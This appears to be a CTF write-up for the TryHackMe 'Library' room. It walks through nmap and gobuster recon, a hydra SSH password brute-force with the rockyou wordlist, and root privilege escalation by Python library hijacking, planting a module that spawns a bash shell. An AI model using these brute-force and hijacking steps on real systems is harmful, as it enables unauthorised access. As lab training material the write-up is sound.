I"´'<p><strong>Library</strong> is a TryHackMe room boot2root machine for FIT and bsides guatemala CTF.</p>

<p>Link: <a href="https://tryhackme.com/room/bsidesgtlibrary">https://tryhackme.com/room/bsidesgtlibrary</a></p>

<h2 id="recon-phase">Recon Phase</h2>
<h3 id="nmap">nmap</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@mirai:~# nmap <span class="nt">-T4</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 10.10.85.187 <span class="nt">-Pn</span>
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-08 15:55 HKT
Nmap scan report <span class="k">for </span>10.10.85.187
Host is up <span class="o">(</span>0.24s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc <span class="o">(</span>RSA<span class="o">)</span>
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>85.22 seconds
</code></pre></div></div>

<p>Since port 80 is open, lets do some passive recon on the website.</p>

<!-- ![](/static/img/thm-library-writeup/user1.png)
![](/static/img/thm-library-writeup/user2.png) -->

<p>I listed down all the usernames I found in the website that is important for later use.</p>
<ol>
  <li>meliodas</li>
  <li>root</li>
  <li>www-data</li>
  <li>Anonymous</li>
</ol>

<p>Since there is no other webpages because menu bars is not clickable, lets scan for subdomains.</p>

<h3 id="gobuster">gobuster</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@mirai:~# gobuster <span class="nb">dir</span> <span class="nt">-u</span> 10.10.85.187 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt <span class="nt">-x</span> php,txt,html <span class="nt">--timeout</span> 50s <span class="nt">-t</span> 170 <span class="nt">-f</span>
<span class="o">===============================================================</span>
2022/03/08 01:36:48 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/images/              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1640]
/icons/               <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 292]
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5439]
/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 33]
</code></pre></div></div>
<p>Opening the <code class="language-plaintext highlighter-rouge">robots.txt</code> on the browser gives the following text.</p>

<p><img src="/static/img/thm-library-writeup/rockyou.png" alt="" /></p>

<p>‚Äúrockyou‚Äù??? Seems familiar because there‚Äôs this famous wordlist named <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, maybe its a hint for us to bruteforce something?</p>

<p>Lets try to bruteforce the port 22 (SSH) with hydra!</p>

<h3 id="hydra">hydra</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> meliodas <span class="nb">users</span> <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt ssh://10.10.85.187 <span class="nt">-t</span> 4
</code></pre></div></div>

<p><img src="/static/img/thm-library-writeup/hydra.png" alt="" /></p>

<p>Successfully cracked the credential with a password of <code class="language-plaintext highlighter-rouge">iloveyou1</code></p>

<p>Login to the ssh and get the <code class="language-plaintext highlighter-rouge">user.txt</code> flag!</p>

<p><img src="/static/img/thm-library-writeup/user3.png" alt="" /></p>

<hr />

<h1 id="privilege-escalation-meliodas--root">Privilege Escalation: meliodas ‚Äì&gt; root</h1>

<h3 id="python-library-hijacking">python library hijacking</h3>
<p>As you can see when running <code class="language-plaintext highlighter-rouge">sudo -l</code> we can run the file <code class="language-plaintext highlighter-rouge">/home/meliodas/bak.py</code> which was owned by <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><img src="/static/img/thm-library-writeup/sudo.png" alt="" /></p>

<p>Lets analyze the code since we cannot modify the python file.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">zipfile</span>

<span class="k">def</span> <span class="nf">zipdir</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">ziph</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">walk</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
        <span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
            <span class="n">ziph</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="nb">file</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">zipf</span> <span class="o">=</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s">'/var/backups/website.zip'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">,</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZIP_DEFLATED</span><span class="p">)</span>
    <span class="n">zipdir</span><span class="p">(</span><span class="s">'/var/www/html'</span><span class="p">,</span> <span class="n">zipf</span><span class="p">)</span>
    <span class="n">zipf</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>The code seems not vunerable to any code injection. So, As I am searching python <code class="language-plaintext highlighter-rouge">zipfile</code> module exploits in google, I came across to this blog post <a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">privilege escalation via python library hijacking</a>.</p>

<p>Let‚Äôs replicate what he did in the blog post.</p>

<ul>
  <li>Create a file <code class="language-plaintext highlighter-rouge">os.py</code> in the same directory as <code class="language-plaintext highlighter-rouge">bak.py</code> and put the contents below.
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">import</span> <span class="nn">pty</span>
  <span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">'/bin/bash'</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>Run this command <code class="language-plaintext highlighter-rouge">sudo /usr/bin/python3 /home/meliodas/bak.py</code>
  <img src="/static/img/thm-library-writeup/os.png" alt="" /></li>
</ul>

<p>It doesnt work with the python <code class="language-plaintext highlighter-rouge">os</code> library, lets repeat the same steps with <code class="language-plaintext highlighter-rouge">zipfile</code> library.</p>

<p>And we are now root!</p>

<p><img src="/static/img/thm-library-writeup/root.png" alt="" /></p>

<h2 id="easiest-way-to-gain-root">Easiest way to gain root</h2>

<ol>
  <li>Delete the <code class="language-plaintext highlighter-rouge">bak.py</code> file</li>
  <li>Create a new one and put the contents below
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="nn">pty</span>
 <span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">'/bin/bash'</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>and run it</p>

    <p><img src="/static/img/thm-library-writeup/root2.png" alt="" /></p>
  </li>
</ol>

<p>Thank you!</p>
:ET